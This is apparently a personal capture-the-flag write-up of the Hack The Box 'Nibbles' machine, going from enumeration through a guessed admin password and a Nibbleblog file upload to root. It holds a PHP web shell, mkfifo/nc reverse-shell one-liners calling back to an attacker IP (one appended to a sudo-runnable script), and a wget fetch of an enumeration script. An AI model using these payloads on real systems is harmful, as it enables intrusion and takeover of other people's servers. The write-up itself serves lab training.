---
date: 2024-02-14
title: Nibbles HTB Write-Up
machine_ip: 10.10.10.75
os: Linux
difficulty: Easy
my_rating: 4
tags:
  - "#RCE"
  - DefaultCred
references: "[[📚CTF Box Writeups]]"
---
## Enumeration

Let's first start with a quick nmap scan

```
-[~]$ nmap -sV --open -oA nibbles_initial_scan 10.10.10.75
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 14:17 PST
Nmap scan report for 10.10.10.75
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.21 seconds

```

* This will run a service enumeration (`-sV`) scan against the default top 1,000 ports and only return open ports (`--open`).&#x20;
* Output all scan formats using `-oA`

Now let's run a full TCP port scan to make sure there arent any missed ports.

```
-[Tue Feb 13-14:18:00]-[table@parrot]-
-[~]$ nmap -p- --open -oA nibbles_full_tcp_scan 10.10.10.75
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 14:22 PST
Nmap scan report for 10.10.10.75
Host is up (0.077s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 24.78 seconds

```

* `-p-` checks for all ports

Using `nc` to do some banner grabbing confirms what `nmap` told us; the target is running an Apache web server and an OpenSSH server.

```
-[Tue Feb 13-14:39:21]-[table@parrot]-
-[~]$ nc -nv 10.10.10.75 22
(UNKNOWN) [10.10.10.75] 22 (ssh) open
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
^C
-[Tue Feb 13-14:40:32]-[table@parrot]-
-[~]$ nc -nv 10.10.10.75 80
(UNKNOWN) [10.10.10.75] 80 (http) open


```

Since the full port scan (`-p-`) has finished and has not found any additional ports. Let's perform a `nmap` [script](https://nmap.org/book/man-nse.html) scan using the `-sC` flag.&#x20;

```
-[Tue Feb 13-14:43:33]-[table@parrot]-
-[~]$ nmap -sC -p 22,80 10.10.10.75
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 14:43 PST
Nmap scan report for 10.10.10.75
Host is up (0.074s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

Nmap done: 1 IP address (1 host up) scanned in 3.09 seconds

```

The script scan did not give us anything handy. Let us round out our `nmap` enumeration using the [http-enum script](https://nmap.org/nsedoc/scripts/http-enum.html), which can be used to enumerate common web application directories.&#x20;

```
-[Tue Feb 13-14:43:47]-[table@parrot]-
-[~]$ nmap -sV --script=http-enum 10.10.10.75
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 14:48 PST
Nmap scan report for 10.10.10.75
Host is up (0.077s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.49 seconds


```

***

## Web Footprinting

We can use whatweb to try to identify the web app in use:

```
-[Tue Feb 13-14:48:14]-[table@parrot]-
-[~]$ whatweb 10.10.10.75
http://10.10.10.75 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75]

```

This tool does not identify any standard web technologies in use. Browsing to the target in `Firefox` shows us a simple "Hello world!" message.

Checking the page source reveals an interesting comment.

* We can also check this with cURL.

```
-[Tue Feb 13-14:51:02]-[table@parrot]-
-[~]$ curl 10.10.10.75
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->

```

Let's check out that directory

```
-[Tue Feb 13-15:00:52]-[table@parrot]-
-[~]$ whatweb http://10.10.10.75/nibbleblog
http://10.10.10.75/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75], RedirectLocation[http://10.10.10.75/nibbleblog/], Title[301 Moved Permanently]
http://10.10.10.75/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]

```

Now we are starting to get a better picture of things. We can see some of the technologies in use such as [HTML5](https://en.wikipedia.org/wiki/HTML5), [jQuery](https://en.wikipedia.org/wiki/JQuery), and [PHP](https://en.wikipedia.org/wiki/PHP). We can also see that the site is running [Nibbleblog](https://www.nibbleblog.com/), which is a free blogging engine built using PHP.

***

## Directory Enumeration

A quick Google search for "nibbleblog exploit" yields this [Nibblblog File Upload Vulnerability](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog\_file\_upload/). Let us use [Gobuster](https://github.com/OJ/gobuster) to be thorough and check for any other accessible pages/directories.

```
-[Tue Feb 13-15:16:39]-[table@parrot]-
-[~]$ gobuster dir -u http://10.10.10.75/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 301]
/.htaccess            (Status: 403) [Size: 306]
/.htpasswd            (Status: 403) [Size: 306]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

`Gobuster` finishes very quickly and confirms the presence of the `admin.php` page. We can check the `README` page for interesting information, such as the version number.

```
-[Tue Feb 13-15:18:10]-[table@parrot]-
-[~]$ curl http://10.10.10.75/nibbleblog/README
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====
* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====
* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory “content” writable by Apache/PHP

<SNIP>
```

So we validate that version 4.0.3 is in use, confirming that this version is likely vulnerable to the `Metasploit` module (though this could be an old `README` page). Nothing else interesting pops out at us. Let us check out the admin portal login page (admin.php).

Now, to use the exploit mentioned above, we will need valid admin credentials. We can try some authorization bypass techniques and common credential pairs manually, such as `admin:admin` and `admin:password`, to no avail. There is a reset password function, but we receive an e-mail error. Also, too many login attempts too quickly trigger a lockout with the message `Nibbleblog security error - Blacklist protection`.

Browsing to `nibbleblog/content` shows some interesting subdirectories `public`, `private`, and `tmp`. Digging around for a while, we find a `users.xml` file which at least seems to confirm the username is indeed admin. It also shows blacklisted IP addresses. We can request this file with `cURL` and prettify the `XML` output using [xmllint](https://linux.die.net/man/1/xmllint).

```
-[Tue Feb 13-15:22:42]-[table@parrot]-
-[~]$ curl -s http://10.10.10.75/nibbleblog/content/private/users.xml | xmllint --format -
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">1</session_fail_count>
    <session_date type="integer">1707866965</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
  <blacklist type="string" ip="10.10.14.16">
    <date type="integer">1707866965</date>
    <fail_count type="integer">4</fail_count>
  </blacklist>
</users>

```

At this point, we have a valid username but no password. Searches of Nibbleblog related documentation show that the password is set during installation, and there is no known default password. Up to this point, have the following pieces of the puzzle:&#x20;

* A Nibbleblog install potentially vulnerable to an authenticated file upload vulnerability
* An admin portal at `nibbleblog/admin.php`
* Directory listing which confirmed that `admin` is a valid username
* Login brute-forcing protection blacklists our IP address after too many invalid login attempts. This takes login brute-forcing with a tool such as [Hydra](https://github.com/vanhauser-thc/thc-hydra) off the table

There are no other ports open, and we did not find any other directories. Which we can confirm by performing additional directory brute-forcing against the root of the web application

```
-[Tue Feb 13-15:35:17]-[table@parrot]-
-[~]$ gobuster dir -u http://10.10.10.75/ --wordlist /usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/index.html           (Status: 200) [Size: 93]
/server-status        (Status: 403) [Size: 299]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Taking another look through all of the exposed directories, we find a `config.xml` file.

Checking it, hoping for passwords proofs fruitless, but we do see two mentions of `nibbles` in the site title as well as the notification e-mail address. This is also the name of the box. Could this be the admin password?

```
-[Tue Feb 13-15:44:15]-[table@parrot]-
-[~]$ curl -s http://10.10.10.75/nibbleblog/content/private/config.xml | xmllint --format -
<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<config>
  <name type="string">Nibbles</name>
  <slogan type="string">Yum yum</slogan>
  <footer type="string">Powered by Nibbleblog</footer>
  <advanced_post_options type="integer">0</advanced_post_options>
  <url type="string">http://10.10.10.134/nibbleblog/</url>
  <path type="string">/nibbleblog/</path>
  <items_rss type="integer">4</items_rss>
  <items_page type="integer">6</items_page>
  <language type="string">en_US</language>
  <timezone type="string">UTC</timezone>
  <timestamp_format type="string">%d %B, %Y</timestamp_format>
  <locale type="string">en_US</locale>
  <img_resize type="integer">1</img_resize>
  <img_resize_width type="integer">1000</img_resize_width>
  <img_resize_height type="integer">600</img_resize_height>
  <img_resize_quality type="integer">100</img_resize_quality>
  <img_resize_option type="string">auto</img_resize_option>
  <img_thumbnail type="integer">1</img_thumbnail>
  <img_thumbnail_width type="integer">190</img_thumbnail_width>
  <img_thumbnail_height type="integer">190</img_thumbnail_height>
  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
  <theme type="string">simpler</theme>
  <notification_comments type="integer">1</notification_comments>
  <notification_session_fail type="integer">0</notification_session_fail>
  <notification_session_start type="integer">0</notification_session_start>
  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
  <seo_site_description type="string"/>
  <seo_keywords type="string"/>
  <seo_robots type="string"/>
  <seo_google_code type="string"/>
  <seo_bing_code type="string"/>
  <seo_author type="string"/>
  <friendly_urls type="integer">0</friendly_urls>
  <default_homepage type="integer">0</default_homepage>
</config>

```

Let us recap what we have found so far:

* We started with a simple `nmap` scan showing two open ports
* Discovered an instance of `Nibbleblog`
* Analyzed the technologies in use using `whatweb`
* Found the admin login portal page at `admin.php`
* Discovered that directory listing is enabled and browsed several directories
* Confirmed that `admin` was the valid username
* Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts
* Uncovered clues that led us to a valid admin password of nibbles

***

## Exploitation

Once in the admin portal using our guessed password (Nibbles) and confirmed username (admin), we see the following pages:

* Publish
* Comments
* Manage
* Settings
* Themes
* Plugins

In Plugins, let's upload a file under the Upload Image. We will check for code execution by uploading a file with the contents `<?php system('id'); ?>`

We get a bunch of errors but looks like it uploaded.

```
Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26

Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27

Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117

Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118

Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43

Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
```

Under `/content`, there is a `plugins` directory and another subdirectory for `my_image`. The full path is at `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/`.

* In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful.
* To check if we have command execution:

```
-[Wed Feb 14-10:03:43]-[table@parrot]-
-[~]$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

We have gained remote code execution on the web server, and the Apache server is running in the `nibbler` user context

We can now modify our PHP file to obtain a reverse shell and start poking around the server.

* Let us use the following `Bash` reverse shell one-liner and add it to our `PHP` script.

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 9443 >/tmp/f"); ?> 
```

We upload the file again and start a `netcat` listener in our terminal:

```
0xdf@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
```

`cURL` the image page again or browse to it in `Firefox` at http://nibbleblog/content/private/plugins/my\_image/image.php to execute the reverse shell.

```
-[Wed Feb 14-10:12:49]-[table@parrot]-
-[~]$ nc -lnvp 9443
listening on [any] 9443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.75] 57830
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Let's upgrade our shell to a "nicer" shell:

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler
<ml/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler            
nibbler@Nibbles:/home/nibbler$ ls
ls
personal.zip  user.txt
```

Retrieve user flag:

```
nibbler@Nibbles:/home/nibbler$ cat user.txt	
```

***

## Privilege Escalation

We can unzip the `personal.zip` file in the `/home/nibbler` directory so lets do that:

```
nibbler@Nibbles:/home/nibbler$ ls
ls
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
```

We see a file called `monitor.sh`

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
cat monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

# clear the screen
clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
        case $name in
          i)iopt=1;;
          v)vopt=1;;
          *)echo "Invalid arg";;
        esac
done

if [[ ! -z $iopt ]]
then
{
wd=$(pwd)
basename "$(test -L "$0" && readlink "$0" || echo "$0")" > /tmp/scriptname
scriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)
su -c "cp $scriptname /usr/bin/monitor" root && echo "Congratulations! Script Installed, now run monitor Command" || echo "Installation failed"
}
fi

if [[ ! -z $vopt ]]
then
{
echo -e "tecmint_monitor version 0.1\nDesigned by Tecmint.com\nReleased Under Apache 2.0 License"
}
fi

if [[ $# -eq 0 ]]
then
{


# Define Variable tecreset
tecreset=$(tput sgr0)

# Check if connected to Internet or not
ping -c 1 google.com &> /dev/null && echo -e '\E[32m'"Internet: $tecreset Connected" || echo -e '\E[32m'"Internet: $tecreset Disconnected"

# Check OS Type
os=$(uname -o)
echo -e '\E[32m'"Operating System Type :" $tecreset $os

# Check OS Release Version and Name
cat /etc/os-release | grep 'NAME\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease
echo -n -e '\E[32m'"OS Name :" $tecreset  && cat /tmp/osrelease | grep -v "VERSION" | cut -f2 -d\"
echo -n -e '\E[32m'"OS Version :" $tecreset && cat /tmp/osrelease | grep -v "NAME" | cut -f2 -d\"

# Check Architecture
architecture=$(uname -m)
echo -e '\E[32m'"Architecture :" $tecreset $architecture

# Check Kernel Release
kernelrelease=$(uname -r)
echo -e '\E[32m'"Kernel Release :" $tecreset $kernelrelease

# Check hostname
echo -e '\E[32m'"Hostname :" $tecreset $HOSTNAME

# Check Internal IP
internalip=$(hostname -I)
echo -e '\E[32m'"Internal IP :" $tecreset $internalip

# Check External IP
externalip=$(curl -s ipecho.net/plain;echo)
echo -e '\E[32m'"External IP : $tecreset "$externalip

# Check DNS
nameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')
echo -e '\E[32m'"Name Servers :" $tecreset $nameservers 

# Check Logged In Users
who>/tmp/who
echo -e '\E[32m'"Logged In users :" $tecreset && cat /tmp/who 

# Check RAM and SWAP Usages
free -h | grep -v + > /tmp/ramcache
echo -e '\E[32m'"Ram Usages :" $tecreset
cat /tmp/ramcache | grep -v "Swap"
echo -e '\E[32m'"Swap Usages :" $tecreset
cat /tmp/ramcache | grep -v "Mem"

# Check Disk Usages
df -h| grep 'Filesystem\|/dev/sda*' > /tmp/diskusage
echo -e '\E[32m'"Disk Usages :" $tecreset 
cat /tmp/diskusage

# Check Load Average
loadaverage=$(top -n 1 -b | grep "load average:" | awk '{print $10 $11 $12}')
echo -e '\E[32m'"Load Average :" $tecreset $loadaverage

# Check System Uptime
tecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)
echo -e '\E[32m'"System Uptime Days/(HH:MM) :" $tecreset $tecuptime

# Unset Variables
unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

# Remove Temporary Files
rm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage
}
fi
shift $(($OPTIND -1))
```

The shell script `monitor.sh` is a monitoring script, and it is owned by our `nibbler` user and writeable.

Let us put this aside for now and pull in [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) to perform some automated privilege escalation checks.

* First, download the script and then start a `Python` HTTP server using the command `sudo python3 -m http.server 8080`.

```
-[Wed Feb 14-10:59:37]-[table@parrot]-
-[~]$ sudo python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.10.75 - - [14/Feb/2024 10:59:58] "GET /LinEnum.sh HTTP/1.1" 200 -
```

On the target machine, download the LinEnum script, give it executable permissions, and execute it:

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ wget http://10.10.14.16:8080/LinEnum.sh
<er/personal/stuff$ wget http://10.10.14.16:8080/LinEnum.sh                  
--2024-02-14 13:59:58--  http://10.10.14.16:8080/LinEnum.sh
Connecting to 10.10.14.16:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh          100%[===================>]  45.54K   282KB/s    in 0.2s    

2024-02-14 13:59:58 (282 KB/s) - 'LinEnum.sh' saved [46631/46631]

nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
ls
LinEnum.sh  monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x LinEnum.sh
chmod +x LinEnum.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ ./LinEnum.sh
./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Wed Feb 14 14:00:19 EST 2024


### SYSTEM ##############################################
[-] Kernel information:
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

<SNIP>


[-] Super user account(s):
root


[+] We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh


<SNIP>


### SCAN COMPLETE ####################################

```

It looks like we can use sudo based on the script results.

If we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user. Let us edit the `monitor.sh` file to append a reverse shell one-liner.

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
```

The contents appended to the end.&#x20;

Execute the script with sudo, using its full path:

```shell-session
 nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh 
```

Catch the root shell on our waiting `nc` listener:

```shell-session
-[Wed Feb 14-11:14:19]-[table@parrot]-
-[~]$ nc -lnvp 8443
listening on [any] 8443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.75] 41634
# id
uid=0(root) gid=0(root) groups=0(root)

```

Grab root flag:

```
root@Nibbles:/# cd root
cd root
root@Nibbles:~# ls
ls
root.txt
root@Nibbles:~# cat root.txt
cat root.txt
c4e3ffb07d835f8e9e0b892edade5730
```
